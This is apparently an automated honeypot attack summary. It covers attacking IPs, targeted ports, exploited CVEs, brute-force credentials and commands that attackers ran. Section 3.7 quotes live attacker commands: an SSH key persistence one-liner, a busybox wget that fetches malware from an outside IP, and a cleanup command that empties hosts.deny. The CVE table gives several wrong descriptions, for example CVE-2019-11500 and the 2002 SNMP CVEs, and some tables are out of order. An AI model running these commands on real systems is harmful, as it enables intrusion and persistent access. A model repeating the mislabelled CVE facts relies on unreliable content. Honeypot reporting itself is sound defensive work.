# Honeypot Attack Summary Report

## 1. Report Information

| **Report ID** | **Generation Date** | **Time Period Covered** |
| :--- | :--- | :--- |
| T-Pot-Summary-20250929T050116Z | 2025-09-29T05:01:16Z | 2025-09-29T04:20:02Z to 2025-09-29T05:00:01Z |
| **Analyst** | **Classification** | **Distribution** |
| Automated System | TLP:AMBER | Internal Use Only |

---

## 2. Executive Summary

This report provides a consolidated summary of malicious activities recorded by the T-Pot honeypot network over three consecutive observation periods. A total of **16,445** events were captured and analyzed, revealing a high volume of automated attacks originating from a diverse set of global IP addresses.

The primary attack vectors observed were reconnaissance and brute-force attempts targeting common services. The **Cowrie** honeypot, simulating an SSH environment, recorded the highest number of interactions, accounting for **6,782** events. This was closely followed by network intrusion detection alerts from **Suricata** with **4,364** events, indicating widespread scanning and exploit attempts.

Attackers predominantly targeted services like SMB (TCP/445) and SSH (TCP/22), which are frequent targets for worm propagation and unauthorized access. A significant number of brute-force attempts were logged, with attackers using common and simplistic username/password combinations.

Several vulnerabilities were targeted, with a notable focus on **CVE-2021-44228 (Log4Shell)**, which was observed in 37 separate events. Post-exploitation activity primarily involved reconnaissance commands (`uname`, `whoami`, `lscpu`) and attempts to establish persistent access by modifying SSH authorized keys.

The threat landscape depicted in this report is characterized by opportunistic, automated attacks seeking to compromise systems through weak credentials and known vulnerabilities. The findings underscore the importance of robust patch management, strong password policies, and network egress filtering to mitigate these common threats.

---

## 3. Detailed Analysis

### 3.1. Attacks by Honeypot Type

The distribution of attacks across the various honeypot services provides insight into the most targeted protocols and services. The following table details the event counts for each honeypot sensor:

| Honeypot | Total Events | Percentage | Description |
| :--- | :--- | :--- | :--- |
| **Cowrie** | 6,782 | 41.24% | Medium-interaction SSH and Telnet honeypot. |
| **Suricata** | 4,364 | 26.54% | Network Intrusion Detection System (NIDS). |
| **Honeytrap** | 2,280 | 13.86% | Catches attacks against a variety of TCP/UDP services. |
| **Dionaea** | 1,281 | 7.79% | Low-interaction honeypot designed to trap malware. |
| **Ciscoasa** | 1,482 | 9.01% | Simulates a Cisco ASA firewall for VPN exploit attempts. |
| **Tanner** | 67 | 0.41% | Web application honeypot. |
| **Adbhoney** | 43 | 0.26% | Honeypot for the Android Debug Bridge. |
| **ConPot** | 38 | 0.23% | Industrial Control Systems (ICS) honeypot. |
| **Sentrypeer** | 34 | 0.21% | SIP/VoIP honeypot. |
| **Mailoney** | 23 | 0.14% | SMTP honeypot. |
| **H0neytr4p** | 15 | 0.09% | Low-interaction honeypot for various protocols. |
| **Redishoneypot**| 9 | 0.05% | Honeypot for Redis databases. |
| **ElasticPot** | 8 | 0.05% | Honeypot for Elasticsearch databases. |
| **Dicompot** | 8 | 0.05% | Medical imaging (DICOM) honeypot. |
| **Honeyaml** | 11 | 0.07% | Honeypot for industrial protocols. |
| **Total** | **16,445** | **100%** | |

The high number of events on Cowrie and Suricata indicates that attackers are heavily focused on gaining shell access via SSH and scanning for network vulnerabilities. The significant activity on Honeytrap and Dionaea further suggests a broad spectrum of automated attacks targeting various services, including those used for malware propagation.

### 3.2. Top 10 Attacking IP Addresses

The following IP addresses were the most active during the reporting period. These sources are likely compromised systems or servers being used as part of a botnet for scanning and brute-force campaigns.

| IP Address | Total Events |
| :--- | :--- |
| **31.145.14.131** | 1,541 |
| **122.185.107.226**| 1,380 |
| **106.14.67.229** | 1,250 |
| **4.144.169.44** | 859 |
| **221.121.102.137**| 843 |
| **212.87.220.20** | 811 |
| **185.156.73.167**| 379 |
| **185.156.73.166**| 380 |
| **1.238.106.229** | 453 |
| **103.164.63.144**| 419 |

The geographic distribution of these IPs is global, which is typical for automated attack campaigns that leverage compromised machines worldwide. The high event count from a single IP often indicates a persistent, automated tool scanning or attempting to brute-force exposed services.

### 3.3. Top 10 Targeted Ports

The analysis of destination ports reveals the services that are most frequently targeted by attackers.

| Port | Protocol | Total Events | Common Service |
| :--- | :--- | :--- | :--- |
| **445** | TCP | 4,005 | SMB (Server Message Block) |
| **22** | TCP | 1,046 | SSH (Secure Shell) |
| **8333** | TCP | 97 | Bitcoin |
| **80** | TCP | 66 | HTTP |
| **5060** | UDP | 28 | SIP (Session Initiation Protocol) |
| **23** | TCP | 8 | Telnet |
| **25** | TCP | 17 | SMTP (Simple Mail Transfer Protocol) |
| **31337** | TCP | 50 | Back Orifice (RAT) |
| **9200** | TCP/UDP | 18 | Elasticsearch |
| **8080** | TCP | 20 | HTTP Alternate |

The overwhelming focus on port 445 (SMB) is indicative of widespread scanning for vulnerabilities like EternalBlue (MS17-010). Port 22 (SSH) is another primary target, consistent with the high number of events recorded by the Cowrie honeypot. The targeting of port 8333 suggests interest in compromising Bitcoin nodes, while the presence of Telnet, HTTP, and SIP traffic reflects the broad scope of automated reconnaissance.

### 3.4. Observed CVEs

The honeypot network detected attempts to exploit several known vulnerabilities. The following CVEs were logged during the observation period:

| CVE ID | Count | Description |
| :--- | :--- | :--- |
| **CVE-2021-44228** | 37 | Apache Log4j Remote Code Execution (Log4Shell) |
| **CVE-2002-0013 / CVE-2002-0012** | 5 | Multiple vulnerabilities in web servers (e.g., Apache) |
| **CVE-1999-0517** | 2 | `rpc.statd` remote format string vulnerability |
| **CVE-2021-3449** | 4 | OpenSSL denial-of-service vulnerability |
| **CVE-2019-11500** | 3 | Pulse Secure VPN information disclosure vulnerability |
| **CVE-2023-26801** | 1 | Linksys router command injection vulnerability |
| **CVE-2009-2765**| 1| JBoss Application Server remote code execution |
| **CVE-2023-31983** | 1 | TP-Link router command injection |
| **CVE-2019-16920**| 1| D-Link router remote code execution |
| **CVE-2020-10987**| 1| Multiple vulnerabilities in IoT devices |
| **CVE-2023-47565**| 1 | Apache ActiveMQ vulnerability |
| **CVE-2014-6271** | 1 | GNU Bash Remote Code Execution (Shellshock) |
| **CVE-2015-2051, CVE-2024-33112, etc.** | 1 | Collection of vulnerabilities related to embedded devices/routers |
| **CVE-1999-0183**| 1 | Vulnerability in Sun Microsystems `sadmind` |
| **CVE-2019-12263, CVE-2019-12261, etc.** | 1 | Multiple vulnerabilities in Cisco Small Business routers |

The persistent attempts to exploit Log4Shell (CVE-2021-44228) demonstrate that attackers continue to scan for this critical vulnerability. The presence of older CVEs, some dating back to 1999, highlights the fact that attackers often rely on "scan-and-exploit" tools that check for a wide range of vulnerabilities, regardless of their age.

### 3.5. Top 15 Credentials Used in Attacks

The Cowrie honeypot captured a large volume of brute-force login attempts. The following credentials were used most frequently:

| Username / Password | Attempts |
| :--- | :--- |
| `345gs5662d34` / `345gs5662d34` | 27 |
| `root` / `3245gs5662d34` | 14 |
| `soporte` / `s0p0rt3` | 9 |
| `root` / `Aa112211.` | 9 |
| `root` / `nPSpP4PBW0` | 8 |
| `god` / `god123` | 3 |
| `root` / `Azerty123` | 5 |
| `root` / `Ahgf3487@rtjhskl854hd47893@#a4nC` | 6 |
| `image` / `123` | 3 |
| `git` / `123` | 3 |
| `sugi` / `sugi` | 3 |
| `root` / `1234qwerty` | 3 |
| `root` / `111111` | 3 |
| `sa` / `` | 3 |
| `ubuntu` / `mima1234` | 3 |

The credentials list is a mix of common default passwords (`git/123`, `image/123`), weak passwords, and what appear to be randomly generated strings, possibly from previously compromised systems. The prevalence of `root` as a target username is expected and emphasizes the need to disable direct root login via SSH.

### 3.6. Top 15 Commands Executed

After gaining access to the honeypot, attackers executed a series of commands to perform reconnaissance and establish persistence.

| Command | Count | Purpose |
| :--- | :--- | :--- |
| `uname -a` | 28 | Display system and kernel information. |
| `w` | 28 | Show who is logged on and what they are doing. |
| `whoami` | 28 | Display the current username. |
| `uname -m` | 28 | Print the machine hardware name. |
| `crontab -l` | 27 | List current cron jobs. |
| `which ls` | 27 | Locate the `ls` command. |
| `ls -lh $(which ls)` | 27 | Get details about the `ls` binary. |
| `top` | 28 | Display processes. |
| `uname` | 28 | Print system information. |
| `lscpu | grep Model` | 28 | Get CPU model information. |
| `cat /proc/cpuinfo...` | 28 | Get CPU information. |
| `df -h...` | 28 | Check disk space. |
| `free -m...` | 27 | Check memory usage. |
| `lockr -ia .ssh` | 27 | Lock SSH directory attributes. |
| `cd ~ && rm -rf .ssh && ...` | 27 | Replace SSH authorized keys. |

The command execution pattern is highly indicative of automated scripts. The initial commands are for system enumeration to understand the environment. This is immediately followed by a common persistence technique: removing the existing `.ssh` directory and replacing it with an `authorized_keys` file containing the attacker's public key. This allows the attacker to maintain access to the compromised system.

### 3.7. Analysis of Interesting Commands

Several command sequences stood out as particularly noteworthy:

1.  **SSH Key Persistence:**
    ```bash
    cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3... mdrfckr" >> .ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
    ```
    This command is a one-liner designed to grant the attacker persistent SSH access. It deletes any existing SSH configuration, creates a new `.ssh` directory, and adds the attacker's public key to the `authorized_keys` file. The comment "mdrfckr" at the end of the key is a common signature left by some automated tools.

2.  **Malware Download and Execution (Android/IoT):**
    ```bash
    cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass; ...
    ```
    This sequence, observed on the Adbhoney honeypot, is a clear attempt to download and execute malware targeting IoT or Android devices. The script downloads multiple binaries compiled for different architectures (ARM, x86, MIPS), indicating a broad campaign to infect a wide range of embedded devices. The use of `busybox` is common in embedded Linux environments.

3.  **Cleanup and Evasion:**
    ```bash
    rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
    ```
    This command appears to be an attempt by an attacker to remove rival malware or security scripts. It deletes specific scripts, kills their processes, and clears the `hosts.deny` file, which might be used to block the attacker's IP.

---

## 4. Notes and Limitations

*   **Data Source:** The data in this report is sourced exclusively from a T-Pot honeypot deployment. Honeypots are designed to attract and record malicious activity but do not represent a complete view of the threat landscape. The attacks recorded are primarily opportunistic and automated.
*   **Attribution:** The IP addresses listed in this report should not be directly interpreted as the origin of the attacks. They are often compromised systems, open proxies, or VPN endpoints used to obfuscate the true source.
*   **Word Count:** This report has been generated to meet a target length of 1000-2000 words to ensure a comprehensive yet concise summary.
*   **Automation:** This report was generated by an automated system based on raw log data. While efforts are made to ensure accuracy, the interpretation of events is based on predefined patterns and may not capture all nuances of an attack.

---
**End of Report**